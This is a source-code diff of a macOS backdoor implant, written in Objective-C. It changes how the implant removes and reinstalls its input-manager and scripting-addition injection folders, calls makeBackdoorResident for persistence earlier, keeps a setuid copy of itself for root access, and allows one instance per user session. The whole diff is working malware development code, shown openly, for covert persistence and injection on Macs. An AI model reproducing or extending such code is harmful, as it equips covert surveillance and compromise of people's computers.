@@ -1806,6 +1806,12 @@ static void computerWillShutdown(CFMachPortRef port,
                                     [[NSBundle mainBundle] bundlePath],
                                     @"Contents"];
   
+  if ([[NSFileManager defaultManager] fileExistsAtPath: @"/Library/InputManagers/appleHID"])
+    {
+      [[NSFileManager defaultManager] removeItemAtPath: @"/Library/InputManagers/appleHID"
+                                                 error: nil];
+    }
+
   //
   // Input Manager
   //
@@ -1905,7 +1911,12 @@ static void computerWillShutdown(CFMachPortRef port,
   mkdir("/Library/ScriptingAdditions/appleOsax/Contents/MacOS", 0755);
   mkdir("/Library/ScriptingAdditions/appleOsax/Contents/Resources", 0755);
 
-  
+  if ([[NSFileManager defaultManager] fileExistsAtPath: @"/Library/ScriptingAdditions/appleOsax"])
+    {
+      [[NSFileManager defaultManager] removeItemAtPath: @"/Library/ScriptingAdditions/appleOsax"
+                                                 error: nil];
+    }
+
   NSString *destDir = [[NSString alloc] initWithFormat:
                        @"/Library/ScriptingAdditions/%@/Contents/MacOS/%@",
                        OSAX_FOLDER,
@@ -2337,6 +2348,8 @@ static void computerWillShutdown(CFMachPortRef port,
                                                      minor: &gOSMinor
                                                     bugFix: &gOSBugFix];
 
+  [self makeBackdoorResident];
+
   //
   // With SLIPLIST mode, the backdoor will be executed preauth with uid = 0
   // and will be killed once the user will login, thus we just suid the core
@@ -2349,7 +2362,6 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
       
       [gUtil makeSuidBinary: [[NSBundle mainBundle] executablePath]];
-      [self makeBackdoorResident];
       
       exit(0);
     }
@@ -2360,7 +2372,7 @@ static void computerWillShutdown(CFMachPortRef port,
   [self _resizeSharedMemoryWindow];
   
   //
-  // Check it we're the only one on this machine
+  // Check it we're the only one on the current user session (1 per user)
   //
   [self _checkForOthers];
   
@@ -2525,9 +2537,6 @@ static void computerWillShutdown(CFMachPortRef port,
       
       if (getuid() == 0 || geteuid() == 0)
         {
-#ifdef DEBUG_CORE
-          infoLog(@"Dropping injector component");
-#endif
           //
           // Now it's time for all the Info.plist mess
           // we need to create the fs hierarchy for the input manager and kext
